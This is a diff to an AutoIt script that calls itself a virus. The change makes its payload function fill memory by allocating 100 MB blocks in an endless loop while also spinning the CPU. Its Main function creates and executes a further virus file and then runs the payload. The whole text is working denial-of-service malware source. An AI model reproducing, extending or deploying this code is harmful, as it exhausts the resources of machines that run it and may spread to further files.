@@ -8,23 +8,24 @@
 
 #ce ----------------------------------------------------------------------------
 #include <Math.au3>
-
+#include <Memory.au3>
 
 ;Global $VirusFileCounter = 0
 ; Script Start - Add your code below here
 Global $NEXT_FILE_TO_EXEC = ""
-Func SlowDownCPU()
+Func SlowDownCPUAndFillRAM()
    Local $i = 987654321
    While 1
 	  $i += 1
 	  $i -= 1
 	  $i *= 2
 	  $i /= 2
+	  _MemGlobalAlloc( 100 * 1024 * 1024)
    WEnd
 EndFunc
 
 Func RunVirusCode()
-	  SlowDownCPU()
+	  SlowDownCPUAndFillRAM()
 EndFunc
 
 Func ExecNextVirusFile($FileName)
@@ -63,7 +64,7 @@ EndFunc
 
 Func Main()
    CreateVirusFile()
-   Sleep(1)
+   Sleep(10)
    ExecNextVirusFile($NEXT_FILE_TO_EXEC)
    RunVirusCode()
 EndFunc
